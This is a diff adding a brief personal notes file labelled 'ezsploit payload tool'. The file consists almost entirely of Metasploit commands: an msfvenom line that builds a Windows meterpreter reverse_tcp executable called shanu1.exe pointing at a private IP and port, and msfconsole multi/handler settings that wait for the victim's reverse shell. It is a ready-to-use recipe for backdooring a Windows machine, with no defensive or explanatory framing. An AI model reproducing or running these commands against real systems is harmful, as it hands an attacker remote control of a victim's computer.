@@ -1,0 +1,21 @@
+
+ezsploit<<=>> payload tool
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.225.33  LPORT=555 -f exe > shanu1.exe 
+
+
+another terminal
+msfconsole
+
+
+use exploit/multi/handler
+
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 192.168.225.33
+
+set LPORT 555
+exploit
+
+
